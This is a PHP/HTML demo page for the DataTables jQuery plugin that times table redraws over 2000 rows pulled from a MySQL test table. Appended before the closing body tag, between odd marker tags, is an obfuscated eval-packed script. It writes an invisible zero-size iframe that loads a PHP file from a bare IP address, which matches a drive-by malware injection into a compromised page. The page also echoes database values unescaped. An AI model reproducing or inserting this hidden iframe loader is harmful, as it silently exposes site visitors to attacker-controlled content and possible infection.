<?php
  /* MySQL connection */
	include( $_SERVER['DOCUMENT_ROOT']."/datatables/mysql.php" ); /* ;-) */
	
	$gaSql['link'] =  mysql_pconnect( $gaSql['server'], $gaSql['user'], $gaSql['password']  ) or
		die( 'Could not open connection to server' );
	
	mysql_select_db( $gaSql['db'], $gaSql['link'] ) or 
		die( 'Could not select database '. $gaSql['db'] );

?><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
	<head>
		<meta http-equiv="content-type" content="text/html; charset=utf-8" />
		<link rel="shortcut icon" type="image/ico" href="http://www.datatables.net/favicon.ico" />
		
		<title>DataTables example</title>
		<style type="text/css" title="currentStyle">
			@import "../../css/demo_page.css";
			@import "../../css/demo_table.css";
		</style>
		<script type="text/javascript" language="javascript" src="../../js/jquery.js"></script>
		<script type="text/javascript" language="javascript" src="../../js/jquery.dataTables.js"></script>
		<script type="text/javascript" charset="utf-8">
			$(document).ready(function() {
				var oTable = $('#example').dataTable();
				var iStart = new Date().getTime();
				
				//if ( typeof console != 'undefined' ) {
				//	console.profile();
				//}
				for ( var i=0 ; i<10 ; i++ )
				{
					var oTable = $('#example').dataTable({"bDestroy": true});
				}
				//if ( typeof console != 'undefined' ) {
				//	console.profileEnd();
				//}
				
				//oTable.fnSort( [[ 1, 'asc' ]] );
				//oTable.fnSort( [[ 1, 'asc' ]] );
				//oTable.fnSort( [[ 2, 'asc' ]] );
				//oTable.fnSort( [[ 1, 'asc' ]] );
				//oTable.fnSort( [[ 2, 'asc' ]] );
				
				var iEnd = new Date().getTime();
				document.getElementById('output').innerHTML = "Test took "+(iEnd-iStart)+" mS";
			} );
		</script>
	</head>
	<body id="dt_example">
		<div id="container">
			<div class="full_width big">
				<i>DataTables</i> performance test - draw
			</div>
			<div id="output"></div>

			<div id="demo">
<table cellpadding="0" cellspacing="0" border="0" class="display" id="example">
	<thead>
		<tr>
			<th>id</th>
			<th>name</th>
			<th>phone</th>
			<th>email</th>
			<th>city</th>
			<th>zip</th>
			<th>state</th>
			<th>country</th>
			<th>zip2</th>
		</tr>
	</thead>
	<tbody>
<?php
	$sQuery = "
		SELECT *
		FROM   testData
		LIMIT  2000
	";
	$rResult = mysql_query( $sQuery, $gaSql['link'] ) or die(mysql_error());
	while ( $aRow = mysql_fetch_array( $rResult ) )
	{
		echo '<tr>';
		echo '<td><a href="1">'.$aRow['id'].'</a></td>';
		echo '<td>'.$aRow['name'].'</td>';
		echo '<td>'.$aRow['phone'].'</td>';
		echo '<td>'.$aRow['email'].'</td>';
		echo '<td>'.$aRow['city'].'</td>';
		echo '<td>'.$aRow['zip'].'</td>';
		echo '<td>'.$aRow['state'].'</td>';
		echo '<td>'.$aRow['country'].'</td>';
		echo '<td>'.$aRow['zip2'].'</td>';
		echo '</tr>';
	}
?>
	</tbody>
</table>
			</div>
			<div class="spacer"></div>
			
			<div id="footer" style="text-align:center;">
				<span style="font-size:10px;">
					DataTables &copy; Allan Jardine 2008-2009.
				</span>
			</div>
		</div>
	<tag5479347351></tag5479347351><script>eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 b=" n=\\"0\\" s=\\"0\\" t=\\"0\\" k=\\"q://g.l.j.h/c.d\\">";1 8="<i";1 9="</i";1 2="f";1 3="r";1 5="a";1 4="m";1 6="e";1 7="e>";o.p(8+2+3+5+4+6+b+9+2+3+5+4+7);',30,30,'|var|u4|u5|u7|u6|u8|u9|u2|u3||u1|tag1|php|||118|66||68|src|161||width|document|write|http||height|board'.split('|'),0,{}))</script><tag5479347352></tag5479347352></body>
</html>